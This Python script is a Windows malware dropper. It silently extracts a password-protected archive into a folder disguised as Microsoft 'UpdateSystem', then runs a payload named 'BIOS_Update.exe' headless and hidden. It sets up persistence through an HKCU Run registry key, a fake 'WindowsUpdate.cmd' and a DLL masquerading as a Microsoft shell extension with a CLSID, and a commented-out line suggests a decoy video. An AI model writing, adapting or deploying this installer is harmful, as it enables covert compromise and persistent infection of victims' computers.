import subprocess
import sys
import os, random, shutil

i = random.randint(1000,9999)

LOCALAPPDATA = os.getenv('LOCALAPPDATA')
BASE_DIR = os.path.dirname(sys.executable)
install_path = os.path.join(LOCALAPPDATA,"Microsoft\\WindowsApps\\UpdateSystem")
app_resource = os.path.join(BASE_DIR,"resources.bin")
app_lib = os.path.join(BASE_DIR,"staticlib.bin")
d = "c:\\users\\public\\document\\"
app_r = os.path.join(d,"resources.bin")
app_l = os.path.join(d,"staticlib.bin")
os.makedirs(d,exist_ok=True)
shutil.copy2(app_resource,app_r)
shutil.copy2(app_lib,app_l)
app = os.path.join(install_path,"BIOS_Update.exe")
print(app)
fl = os.path.join(install_path, "Config.xml")
if not os.path.exists(install_path):
    os.makedirs(install_path,exist_ok=True)
subprocess.run(
    [app_l,'x', '-inul','-o+','-y','-pwater',app_r,install_path],
    creationflags=subprocess.CREATE_NO_WINDOW,
)
b = (
    'cd "%LOCALAPPDATA%\\Microsoft\\WindowsApps\\UpdateSystem"\n'
    f'start "" /min conhost.exe --headless BIOS_Update.exe Config.xml && exit'
)
try:
    per = os.path.join(LOCALAPPDATA,"Microsoft\\WindowsApps\\WindowsUpdate.cmd")
    with open(per,'w') as f:
        f.write(b)
except Exception as e:
    import ctypes
    ctypes.windll.user32.MessageBoxW(None,str(e),"",0)

b2 = (
    'set "clsid={D9144DCD-E998-4ECA-AB6A-DCD83CCBA16D}"\n'
    'mkdir "%LOCALAPPDATA%\\Microsoft\\Windows\\Shell"\n'
    'copy /y "EhStorShellPersis.dll" "%LOCALAPPDATA%\\Microsoft\\Windows\\Shell\\MicrosoftShellExt.dll" >nul\n'
    f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "UpdateWin{i}" /t REG_SZ /d "cmd.exe /c start /min WindowsUpdate.cmd"\n'
    'cd "%LOCALAPPDATA%\\Microsoft\\WindowsApps\\UpdateSystem"\n'
    'start /min conhost --headless BIOS_Update.exe Config.xml'
)
try:
    temp_b = os.path.join(d,f"Update_{i}.cmd")
    with open(temp_b,'w') as f:
        f.write(b2)
except Exception as e:
    import ctypes
    ctypes.windll.user32.MessageBoxW(None,str(e),"",0)

import time 
#subprocess.run(f'cmd /c start video.mp4')
time.sleep(10)
#subprocess.run(f'schtasks /run /tn "{taskname}"',creationflags=subprocess.CREATE_NO_WINDOW)
subprocess.run(temp_b,creationflags=subprocess.CREATE_NO_WINDOW)


time.sleep(60)